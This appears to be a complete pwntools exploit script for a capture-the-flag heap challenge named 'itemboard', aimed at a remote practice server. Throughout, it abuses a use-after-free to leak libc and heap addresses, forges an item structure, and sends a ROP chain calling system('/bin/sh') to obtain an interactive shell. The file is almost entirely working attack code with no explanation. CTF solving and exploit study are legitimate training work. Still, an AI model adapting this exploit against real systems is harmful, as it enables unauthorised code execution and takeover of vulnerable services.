from pwn import *

#p = process('./itemboard')
p = remote('node4.buuoj.cn', 29975)
libc = ELF('libc-2.23.buu.so')

#context.log_level = 'debug'
context.arch = 'amd64'

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.23/64/libc-2.23.debug.so
    ''' + s)

def alloc(name, size, content):
    sla(b'choose:', b'1')
    sa(b'name?', name)
    sla(b'len?', str(size).encode())
    sa(b'Description?', content)

def list():
    sla(b'choose:', b'2')

def show(index):
    sla(b'choose:', b'3')
    sla(b'Which item?', str(index).encode())

def delete(index):
    sla(b'choose:', b'4')
    sla(b'Which item?', str(index).encode())

alloc(b'a\n', 0x80, b'aaa\n') #0
alloc(b'a\n', 0x80, b'aaa\n') #1
alloc(b'a\n', 0x80, b'aaa\n') #2
alloc(b'a\n', 0x80, b'aaa\n') #3

delete(0)
show(0)
libc_base = u64(ru('\x7f')[-6:].ljust(8, b'\x00')) - 0x68 - libc.sym['__malloc_hook']
success('libc_base -> {}'.format(hex(libc_base)))

pop_rdi_ret = libc_base + 0x21102
ret = pop_rdi_ret + 1
bin_sh = libc_base + next(libc.search(b'/bin/sh'))
system = libc_base + libc.sym['system']

delete(2)
show(2)
ru(b'Description:')
heap_base = u64(rv(6).ljust(8, b'\x00')) - 0x510
success('heap_base -> {}'.format(hex(heap_base)))

fake_item = b'aaaaaaaa' + p64(heap_base + 0x30) + b'\n'
alloc(fake_item, 0x80, b'a\n')
fake_item_addr = heap_base + 0x6b0
success('fake_item_addr -> {}'.format(hex(fake_item_addr)))

layout = {
    0x408 : [fake_item_addr, heap_base, pop_rdi_ret, bin_sh, system]
}

rop = flat(layout, filler = b'\x00')

#debug('b *$rebase(0xcdd)')
alloc(b'a\n', len(rop), rop)

p.interactive()